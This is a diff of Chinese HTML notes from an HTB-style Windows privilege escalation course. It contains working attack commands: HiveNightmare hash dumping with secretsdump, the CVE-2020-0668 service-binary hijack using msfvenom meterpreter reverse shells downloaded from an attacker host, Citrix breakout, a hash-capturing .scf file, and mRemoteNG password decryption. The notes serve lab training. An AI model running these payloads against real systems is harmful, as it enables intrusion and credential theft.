 <p>或者在当前会话里尝试：</p>
-<p>runas /user:hacker cmd</p>
+<pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
 <p>然后输入密码。</p>
 <hr />
-<h4>再提升到高完整性 shell</h4>
+<h4>再提升到高完整性 Shell</h4>
 <p>如果只是管理员组但还是中完整性，执行：</p>
-<p>Start-Process cmd -Verb RunAs</p>
+<pre><code class="language-powershell">Start-Process cmd -Verb RunAs</code></pre>
 <p>弹 UAC 就点是。</p>
 <hr />
-<h4>读 flag</h4>
-<p>type C:\Users\Administrator\Desktop\flag.txt</p>
+<h4>读取 flag</h4>
+<pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
 <p>如果文件名不是这个，先：</p>
-<p>dir C:\Users\Administrator\Desktop</p>
+<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
 <hr />
 <h3>二、HiveNightmare / SeriousSam</h3>
 <p>这个示例的本质是： <strong>低权限读取注册表影子副本 -&gt; 导出 hive -&gt; 离线提 hash</strong>。</p>
 <hr />
-<h4>检查 SAM 权限</h4>
-<p>icacls C:\Windows\System32\config\SAM</p>
+<h4>检查 SAM 文件权限</h4>
+<pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
 <p>你要看有没有类似：</p>
-<p>BUILTIN\Users:(I)(RX)</p>
+<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
 <p>如果有，说明有戏。</p>
 <hr />
 <h4>运行 HiveNightmare</h4>
 <p>假设工具已经在桌面或工具目录：</p>
-<p>.\HiveNightmare.exe</p>
+<pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
 <p>正常会吐出：</p>
 <ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
 <ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
@@ -6076,7 +6084,7 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <hr />
 <h4>把文件传回攻击机</h4>
 <p>在攻击机开 HTTP 或 SMB 收，或者直接 RDP 拖出来。 如果你在 Kali 上，用 impacket 解析：</p>
-<p>impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</p>
+<pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
 <hr />
 <h4>拿到哈希后怎么用</h4>
 <p>如果看到管理员或其他高权限账户哈希，可以尝试：</p>
@@ -6087,33 +6095,34 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p><strong>“验证这个漏洞能被利用”</strong>。</p>
 <p>如果题目硬要求 “try out 3 examples”，你跑通导出 hive 并拿到 hash，基本就算完成这个示例了。</p>
 <hr />
-<h3>三、CVE-2020-0668 + Mozilla Maintenance Service</h3>
+<h3>三、CVE-2020-0668 与 Mozilla Maintenance Service 提权链</h3>
 <p>这个是本节里最像“标准 SYSTEM 提权”的链子。</p>
 <h4>先确认当前权限不高</h4>
-<p>whoami /priv</p>
+<pre><code class="language-cmd">whoami /priv</code></pre>
 <p>一般会看到你只是普通用户权限。</p>
 <hr />
-<h4>检查 Mozilla Maintenance Service 二进制权限</h4>
-<p>icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
+<h4>检查 Mozilla Maintenance Service 二进制文件权限</h4>
+<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <p>正常一开始你应该只有：</p>
-<p>BUILTIN\Users:(I)(RX)</p>
+<pre><code>BUILTIN\Users:(I)(RX)</code></pre>
 <p>也就是只能读执行，不能写。</p>
 <hr />
-<h4>在攻击机生成恶意 exe</h4>
+<h4>在攻击机生成恶意 EXE</h4>
 <p>如果你用 msfvenom：</p>
-<p>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;你的VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</p>
+<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;你的VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
 <hr />
-<h4>在攻击机开 HTTP 服务</h4>
-<p>python3 -m http.server 8080</p>
+<h4>在攻击机开启 HTTP 服务</h4>
+<pre><code class="language-shell">python3 -m http.server 8080</code></pre>
 <hr />
-<h4>在目标机下载两份恶意 exe</h4>
+<h4>在目标机下载两份恶意 EXE</h4>
 <p>PowerShell：</p>
-<p>wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</p>
+<pre><code class="language-powershell">wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
+wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
 <p>为什么两份？ 因为第一份在漏洞利用过程中会被“搞坏”，第二份是备用的干净版本。</p>
 <hr />
 <h4>运行 CVE-2020-0668</h4>
 <p>假设 exploit 在 <code>C:\Tools\CVE-2020-0668\</code>：</p>
-<p>C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
+<pre><code class="language-cmd">C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <p>如果输出里有：</p>
 <ul><li><code>Moving ...</code></li></ul>
 <ul><li><code>Creating symbol links</code></li></ul>
@@ -6122,42 +6131,47 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>说明大体跑通了。</p>
 <hr />
 <h4>再检查目标文件权限</h4>
-<p>icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
+<pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <p>这时你应该看到自己用户对它有：</p>
-<p>(F)</p>
+<pre><code>(F)</code></pre>
 <p>也就是 Full Control。</p>
 <hr />
-<h4>用第二份干净恶意 exe 覆盖它</h4>
+<h4>用第二份干净恶意 EXE 覆盖目标服务文件</h4>
 <p>注意这步要在 <strong>cmd.exe</strong> 里执行，不是 PowerShell。</p>
-<p>copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</p>
+<pre><code class="language-cmd">copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <hr />
-<h4>攻击机开 handler</h4>
+<h4>在攻击机启动 Metasploit handler</h4>
 <p>先写一个 <code>handler.rc</code>：</p>
-<p>use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_https set LHOST &lt;你的VPN_IP&gt; set LPORT 8443 exploit</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST &lt;你的VPN_IP&gt;
+set LPORT 8443
+exploit</code></pre>
 <p>启动：</p>
-<p>sudo msfconsole -r handler.rc</p>
+<pre><code class="language-shell">sudo msfconsole -r handler.rc</code></pre>
 <hr />
-<h4>启动 Mozilla 服务</h4>
+<h4>启动 Mozilla Maintenance 服务</h4>
 <p>目标机执行：</p>
-<p>net start MozillaMaintenance</p>
+<pre><code class="language-cmd">net start MozillaMaintenance</code></pre>
 <p>即使报错：</p>
-<p>The service is not responding to the control function</p>
+<pre><code>The service is not responding to the control function</code></pre>
 <p>也别慌，这种错误在这类题里经常只是“服务没正常起来，但 payload 已经执行了”。</p>
 <hr />
-<h4>在 msfconsole 里拿 SYSTEM session</h4>
+<h4>在 msfconsole 中获取 SYSTEM 会话</h4>
 <p>成功后通常会弹回：</p>
-<p>Meterpreter session opened ...</p>
+<pre><code>Meterpreter session opened ...</code></pre>
 <p>进去确认：</p>
-<p>getuid</p>
+<pre><code>getuid</code></pre>
 <p>你想看到的是：</p>
-<p>NT AUTHORITY\SYSTEM</p>
+<pre><code>NT AUTHORITY\SYSTEM</code></pre>
 <hr />
-<h4>然后读 flag</h4>
+<h4>最后读取 flag</h4>
 <p>如果你在 meterpreter 里：</p>
-<p>shell type C:\Users\Administrator\Desktop\flag.txt</p>
+<pre><code>shell
+type C:\Users\Administrator\Desktop\flag.txt</code></pre>
 <p>如果文件名不对：</p>
-<p>dir C:\Users\Administrator\Desktop</p>
-<h2>Credential Theft</h2>
+<pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
+<h2>凭据窃取</h2>
 <h3>搜索</h3>
 <p>违背最佳实践，应用程序通常将密码存储在明文配置文件中。假设我们在一个无权限用户账户的上下文中获得命令执行。在这种情况下，我们可能能找到他们管理员账户或其他特权本地或域账户的凭证。我们可以使用 <a href="https://ss64.com/nt/findstr.html" target="_blank" rel="noreferrer">findstr</a> 工具来搜索这些敏感信息。</p>
 <ol><li><strong>应用配置文件</strong></li></ol>
@@ -6702,7 +6716,7 @@ Cost settings
     Over Data Limit        : No
     Roaming                : No
     Cost Source            : Default</code></pre>
-<h2>Citrix Breakout</h2>
+<h2>Citrix 受限环境突破</h2>
 <p>许多组织利用虚拟化平台，如终端服务、Citrix、AWS AppStream、CyberArk PSM 和自助终端，提供远程访问解决方案以满足其业务需求。然而，在大多数组织中，桌面环境会实施“锁定”措施，以最大限度地减少恶意员工和被入侵账户对整体域名安全的潜在影响。虽然这些桌面限制可能阻碍威胁行为者，但他们仍有可能“突破”受限环境。</p>
 <p>Breakout基础方法：</p>
 <p>进入<code>对话框</code> 。</p>
@@ -6728,7 +6742,7 @@ Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -
 <p>从开始菜单运行<code>绘画</code> ，点击 <code>“文件 &gt; 打开</code> ”以打开对话框。</p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png" alt="Pasted image 20260322063517" />
 <p>打开 Windows 绘制对话框后，我们可以在文件名字段下输入 <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" target="_blank" rel="noreferrer">UNC</a> 路径 <code>\\127.0.0.1\c$\users\pmorgan</code>，并将 File-Type 设置为<code>所有文件</code> ，按下回车后即可访问所需的目录。</p>
-<h3>从受限环境中访问SMB share</h3>
+<h3>从受限环境中访问 SMB 共享</h3>
 <p>由于设置了限制，文件资源管理器不允许直接访问攻击者机器上的 SMB 共享，也不能访问托管 Citrix 环境的 Ubuntu 服务器。不过，通过在 Windows 对话框中使用 UNC 路径，可以绕过这一限制。这种方法可用于促进从另一台计算机传输文件。</p>
 <p>用 Impacket的 <code>smbserver.py</code> 脚本从 Ubuntu 机器启动 SMB 服务器。</p>
 <pre><code>root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
@@ -6750,7 +6764,7 @@ int main() {
 }</code></pre>
 <p>然后我们可以利用获得的 cmd 权限，将文件从 SMB 共享复制到 pmorgan 的桌面目录。</p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png" alt="Pasted image 20260322063831" />
-<h3>Explorer的替代品</h3>
+<h3>Explorer 的替代方案</h3>
 <p>在对文件资源管理器施加严格限制的情况下，可以使用像 <code>Q-Dir</code> 或 <code>Explorer++</code> 这样的替代文件系统编辑器作为变通方法。这些工具可以绕过组策略强制执行的文件夹限制，使用户能够浏览和访问在标准文件资源管理器环境中本应受限的文件和目录。</p>
 <p>值得注意的是，之前文件资源管理器无法从 SMB 共享复制文件，原因是存在一些限制。然而，通过利用 <code>Explorer++</code>，以下截图已成功演示了将文件从 <code>\\13.38.95\share</code> 位置复制到属于用户 <code>pmorgan</code> 的桌面的功能。</p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png" alt="Pasted image 20260322063901" />
@@ -6772,7 +6786,7 @@ int main() {
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png" alt="Pasted image 20260322064055" />
 <p>如果现有快捷键文件不可用，还有其他方法可以考虑。一种选择是通过 SMB 服务器传输已有的快捷方式文件。或者，我们可以按照 <code>Generating a Malicious .lnk File</code> 标签页下“ 与用户互动”部分提到的，使用 PowerShell 创建一个新的快捷方式文件。这些方法在使用快捷键文件时实现目标提供了灵活性。</p>
 <pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
-<h2>Additional Techniques</h2>
+<h2>补充技巧</h2>
 <h3>与用户进行交互</h3>
 <p>用户有时是组织中最薄弱的一环。一个超载的员工在快速工作时，可能在浏览共享硬盘、点击链接或运行文件时，注意到机器上有“异常”。正如本模块中所讨论的，Windows 给我们带来了巨大的攻击面，在枚举本地权限升级向量时需要检查许多事项。当我们用尽所有方法后，可以考虑具体手段，通过监听用户的网络流量/本地命令，或攻击需要用户互动的已知易受攻击服务来窃取凭证。我最喜欢的技巧之一是将恶意文件放置在访问频繁的文件共享周围，试图获取用户密码哈希值，以便以后离线破解。</p>
 <h4>流量捕获</h4>
@@ -6781,7 +6795,7 @@ int main() {
 <p>这里我们可以看到一个粗略示例，如何捕获其他用户在同一输入框时输入的明文 FTP 凭证。虽然可能性不大，但如果 <code>Wireshark</code> 安装在我们降落的设备上，值得尝试流量捕获，看看能捕捉到什么。</p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png" alt="Pasted image 20260322164844" />
 <p>另外，假设我们的客户将我们置于环境中的攻击机器上。在这种情况下，值得先运行 <code>tcpdump</code> 或 <code>Wireshark</code> 一段时间，看看有哪些类型的流量通过线路传输，以及是否能发现什么有趣的情况。工具网络信用记录可以从我们的攻击设备运行，从实时界面或 pcap 文件中检测密码和哈希值。值得在评估时让该工具在后台运行，或者用 pcap 测试，看看能否提取对权限升级或横向转移有用的凭证。</p>
-<h4>Process Command Line</h4>
+<h4>进程命令行审计</h4>
 <p>进程命令行</p>
 <p><strong>进程命令行监控</strong></p>
 <p>作为用户获得 shell 时，可能会有计划任务或其他进程在命令行传递凭证。我们可以用下面这个脚本来查找进程命令行。它每两秒捕获进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。</p>
@@ -6800,12 +6814,12 @@ Command=2
 IconFile=\\10.10.15.137\share\test.ico
 [Taskbar]
 Command=ToggleDesktop</code></pre>
-<h3>Pillaging</h3>
+<h3>信息搜刮</h3>
 <pre><code>python3 mremoteng_decrypt.py -s "s1lN9UQqWy2QFv2aKVGFa2YRfFvpObytu04vyCuVQi12M0kyV3Xc0xwAlTz0aSNRiR3Rilf6Xb4XQ="
 
 </code></pre>
-<h3>Miscellaneous Techniques</h3>
-<h2>Skill Assessment</h2>
+<h3>其他技巧</h3>
+<h2>技能评估</h2>
 <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.137 LPORT=9919 -f exe -o payload.exe  
   
 python3 -m http.server
